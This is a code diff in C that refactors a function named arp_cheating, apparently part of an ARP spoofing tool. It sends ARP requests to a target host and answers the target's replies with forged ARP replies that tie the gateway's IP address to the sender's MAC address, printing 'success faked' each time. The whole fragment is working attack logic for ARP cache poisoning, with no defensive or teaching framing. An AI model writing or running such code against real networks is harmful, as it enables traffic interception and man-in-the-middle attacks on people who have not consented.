@@ -300,7 +300,7 @@ int arp_cheating(char *dstip)
 {
     int fd, len;
     struct sockaddr addr;
-    struct frame_arp snd_buf, recv_buf, reply_snd_buf;
+    struct frame_arp recv_buf;
     char ifname[10] = {0};
     unsigned char src_mac[6];
     unsigned char src_ip[6];
@@ -351,21 +351,8 @@ int arp_cheating(char *dstip)
     /**
      * init arp request packet
      */
-    memcpy(snd_buf.fh.src_mac, src_mac, 6);
-    memcpy(snd_buf.src_mac, src_mac, 6);
-    memset(snd_buf.fh.dst_mac, -1, 6);
-    memset(snd_buf.dst_mac, 0, 6);
-    snd_buf.fh.proto_type = htons(ETH_P_ARP);
-    snd_buf.ah.ar_hrd = htons(ARPHRD_ETHER);
-    snd_buf.ah.ar_pro = htons(ETH_P_IP);
-    snd_buf.ah.ar_hln = 6;
-    snd_buf.ah.ar_pln = 4;
-    snd_buf.ah.ar_op = htons(ARPOP_REQUEST);
-    memcpy(snd_buf.dst_ip, dst_ip, 4);
-    memcpy(snd_buf.src_ip, src_ip, 4);
-
     len = sizeof(struct sockaddr);
-    sendto(fd, &snd_buf, sizeof(snd_buf), 0, &addr, len);
+    arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
     printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
             dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
 
@@ -399,21 +386,27 @@ int arp_cheating(char *dstip)
             printf("\n");
 
             if (memcmp(recv_buf.src_ip, dst_ip, 4)) {
-                sendto(fd, &snd_buf, sizeof(snd_buf), 0, &addr, len);
+                arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
                 printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
                         dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
                 continue;
             }
             if (ar_op == ARPOP_REQUEST)
-                sendto(fd, &snd_buf, sizeof(snd_buf), 0, &addr, len);
-            else if (ar_op == ARPOP_REPLY) {
-                sleep(1);
-                memcpy(reply_snd_buf.fh.dst_mac, recv_buf.src_mac, 6);
-                memcpy(reply_snd_buf.dst_mac, recv_buf.src_mac, 6);
-                sendto(fd, &reply_snd_buf, sizeof(reply_snd_buf), 0, &addr, len);
-                printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
-                        (recv_buf.src_ip)[0], (recv_buf.src_ip)[1],
-                        (recv_buf.src_ip)[2], (recv_buf.src_ip)[3]);
+            {
+                if (!memcmp(recv_buf.src_ip, gw_ip, 4) || (!memcmp(recv_buf.src_ip, dst_ip, 4) && !memcmp(recv_buf.dst_ip, gw_ip, 4))) {
+                    printf("request\n");
+                    sleep(1);
+                    arp_request_send(fd, &addr, dst_ip, src_ip, src_mac);
+                    printf("\033[0;32msuccess send arp request to %d.%d.%d.%d\n\033[0m", 
+                            dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3]);
+                }
+            } else if (ar_op == ARPOP_REPLY) {
+                if (!memcmp(recv_buf.src_ip, dst_ip, 4) && !memcmp(recv_buf.dst_ip, src_ip, 4)) {
+                    arp_reply_send(fd, &addr, dst_ip, recv_buf.src_mac, gw_ip, src_mac);
+                    printf("\033[0;35msuccess faked %d.%d.%d.%d\n\033[0m", 
+                            (recv_buf.src_ip)[0], (recv_buf.src_ip)[1],
+                            (recv_buf.src_ip)[2], (recv_buf.src_ip)[3]);
+                }
             }
         }
     }
